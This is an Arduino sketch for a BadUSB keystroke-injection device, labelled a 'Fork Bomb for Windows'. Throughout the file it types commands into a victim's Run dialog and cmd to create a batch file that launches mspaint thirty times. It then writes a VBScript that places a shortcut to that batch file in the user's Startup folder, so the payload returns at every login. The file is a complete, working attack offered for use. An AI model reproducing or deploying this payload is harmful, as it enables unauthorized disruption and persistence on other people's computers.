
// Fork Bomb for Windows. By: BlueArduino20

#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  
  // Let's give windows time to recognize our BadUSB
  delay(35000);
  
  Keyboard.begin();

  // Start Payload 

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(10);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("@ echo off");

   typeKey(KEY_RETURN);

   

  Keyboard.print("copy con F.bat");

  typeKey(KEY_RETURN);

 /* Keyboard.print(":A");

  typeKey(KEY_RETURN);*/

   Keyboard.print("@ echo off");

   typeKey(KEY_RETURN);

  
  for(int i=0;i<30;i++){
  
  Keyboard.print("start mspaint.exe");

  typeKey(KEY_RETURN);
  }
  /*Keyboard.print("GOTO A");

  typeKey(KEY_RETURN);*/  

  Keyboard.print("exit");

  typeKey(KEY_RETURN);
 
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  


  Keyboard.print("copy con permanen.vbs");


  typeKey(KEY_RETURN);

  Keyboard.print("Option Explicit");

  typeKey(KEY_RETURN);
  
  Keyboard.print("Dim obj, nLink, strCurDir");

  typeKey(KEY_RETURN);

  Keyboard.print("Set obj = CreateObject(\"Wscript.Shell\")");

  typeKey(KEY_RETURN);
  
  Keyboard.print("strCurDir = obj.ExpandEnvironmentStrings(\"%USERNAME%\")");

  typeKey(KEY_RETURN);
  
  Keyboard.print("Set nLink = obj.CreateShortcut(\"C:\\Users\\\" & strCurDir & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk\")");

  typeKey(KEY_RETURN);
  
  
  //Keyboard.print("Set objSysInfo = Createobject(\"ADSystemInfo\")");


  //typeKey(KEY_RETURN);
  
  Keyboard.print("nLink.TargetPath = \"C:\\Users\\\" & strCurDir & \"\\F.bat\"");

  typeKey(KEY_RETURN);
  
  Keyboard.print("nLink.Save");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(10);  


  // start shortcut script

  
  Keyboard.print("start permanen.vbs");

  typeKey(KEY_RETURN);
  
  Keyboard.print("start F.bat && exit");

  typeKey(KEY_RETURN);

  // End Payload
  

  Keyboard.end();
}

// Unused

void loop() {}
